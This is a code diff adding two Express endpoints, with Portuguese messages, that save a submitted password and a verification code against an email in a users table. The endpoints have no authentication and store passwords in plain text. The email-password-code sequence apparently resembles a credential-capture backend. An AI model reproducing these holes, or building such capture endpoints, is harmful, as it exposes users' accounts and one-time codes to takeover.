@@ -45,4 +45,26 @@ app.post('/salvar-email', async (req, res) => {
   }
 });
 
+app.post('/salvar-senha', async (req, res) => {
+  const { email, senha } = req.body;
+  if (!email || !senha) return res.status(400).json({ mensagem: 'Dados obrigatórios.' });
+  try {
+    await db.query('UPDATE usuarios SET senha = ? WHERE email = ?', [senha, email]);
+    return res.json({ mensagem: 'Senha salva.' });
+  } catch (err) {
+    return res.status(500).json({ mensagem: 'Erro ao salvar senha.' });
+  }
+});
+
+app.post('/salvar-codigo', async (req, res) => {
+  const { email, codigo } = req.body;
+  if (!email || !codigo) return res.status(400).json({ mensagem: 'Dados obrigatórios.' });
+  try {
+    await db.query('UPDATE usuarios SET codigo = ? WHERE email = ?', [codigo, email]);
+    return res.json({ mensagem: 'Código salvo.' });
+  } catch (err) {
+    return res.status(500).json({ mensagem: 'Erro ao salvar código.' });
+  }
+});
+
 app.listen(PORT, () => console.log(`Servidor rodando na porta ${PORT}`));
